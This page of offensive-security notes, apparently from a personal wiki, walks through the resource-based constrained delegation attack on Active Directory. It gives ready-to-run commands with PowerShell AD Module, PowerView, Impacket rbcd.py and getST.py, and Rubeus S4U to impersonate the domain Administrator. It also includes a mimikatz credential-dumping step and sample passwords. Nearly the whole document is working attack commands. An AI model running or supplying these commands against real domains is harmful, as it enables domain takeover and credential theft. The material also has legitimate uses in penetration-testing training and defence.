---
title: RBCD
tags:
  - rbcd
  - activedirectory
  - deelgations
aliases:
  - resource-based constrained delegation
enableToc: "true"
---
## Resource-Based Constrained Delegation (RBCD)
This attack is possible if owned user/computer object has _GenericWrite_ or write privilege to user/computer object attributes. Since we have write privilege, we can write to _msds-allowedtoactonbehalfofotheridentity_ property. There are few requirements needed in order to perform this attack.

| Name                                              | Value         |
| ------------------------------------------------- | ------------- |
| Domain object with SPN set (computer/service acc) | `mycomputer$` |
| Principal's plain-text or hashes (rc4/aes-256)    | `Range2022!`  |
1. Import ADModule
2. Set _msds-allowedtoactonbehalfofotheridentity_ to owned computer/user objects.

```powershell
# AD-Module
Set-ADComputer -Identity dc01 -PrincipalsAllowedToDelegateToAccount (Get-ADComputer mycomputer)

# PowerView
Add-DomainObjectAcl -TargetIdentity dc01 -PrincipalIdentity mycomputer -Rights rbcd

# Impacket
rbcd.py kiwi.local/kiwiadm:Password1234 -action write -delegate-to 'kiwi-dc$' -delegate-from cami.nichole -dc-ip 192.168.86.189
```

3. Get mycomputer$ ntlm hash or aes keys

```powershell
mimikatz# sekurlsa::logonpasswords
```

4. Apply s4u delegation (TGT+TGS)

```powershell
# rubeus
Rubeus.exe s4u /user:mycomputer$ /rc4:<rc4/ntlm hash> /impersonateuser:administrator /msdsspn:http/dc01 /altservice:cifs /ptt

# impacket 
getST.py range.net/mssqlsvc:'Range2022!' -dc-ip 192.168.86.182 -spn cifs/dc01.range.net -impersonate Administrator
```

>[!References]
>- [Harmj0y's gist on abusing RBCD with PowerShell/PowerView/PowerMad](https://gist.github.com/HarmJ0y/224dbfef83febdaf885a8451e40d52ff)
>- [ired.team](https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/resource-based-constrained-delegation-ad-computer-object-take-over-and-privilged-code-execution)
